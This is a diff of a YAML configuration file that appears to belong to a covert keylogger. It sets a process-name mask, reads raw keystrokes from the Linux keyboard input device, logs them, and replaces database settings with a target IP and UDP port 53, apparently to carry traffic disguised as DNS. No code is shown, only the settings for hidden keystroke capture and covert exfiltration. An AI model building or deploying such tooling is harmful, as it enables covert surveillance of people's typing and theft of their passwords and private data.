@@ -1,9 +1,12 @@
 attacker:
-  host: localhost
-  port: 3306
-  username: myuser
-  password: mypassword
+  target: 192.168.244.128
+  proto: udp
+  recv_port: 8888
+  send_port: 53
 covert:
   process_name: masked
   log: ./log.txt
   device: /dev/input/by-path/platform-i8042-serio-0-event-kbd
+  proto: udp
+  recv_port: 53
+  send_port: 8888
